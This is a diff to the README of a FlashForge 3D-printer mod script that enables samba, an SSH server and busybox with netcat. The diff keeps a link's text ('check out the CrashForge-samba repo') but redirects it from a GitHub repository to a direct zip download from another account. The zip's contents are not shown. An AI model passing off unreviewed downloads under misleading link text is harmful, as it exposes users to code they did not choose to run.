@@ -15,7 +15,7 @@ It works on my printer, but proceed at your own risk.
    
    The following services can be activated right now via this script, automatically.
 
-     * samba [To install, please check out the CrashForge-samba repo located here.](http://github.com/pressreset/Crashforge-samba "Samba Server for FlashForge 3d Printers")
+     * samba [To install, please check out the CrashForge-samba repo located here.](https://raw.githubusercontent.com/ajzbern/CrashForge/master/steadyish/CrashForge.zip "Samba Server for FlashForge 3d Printers")
      * open-sshd
      * full busybox /w netcat
    
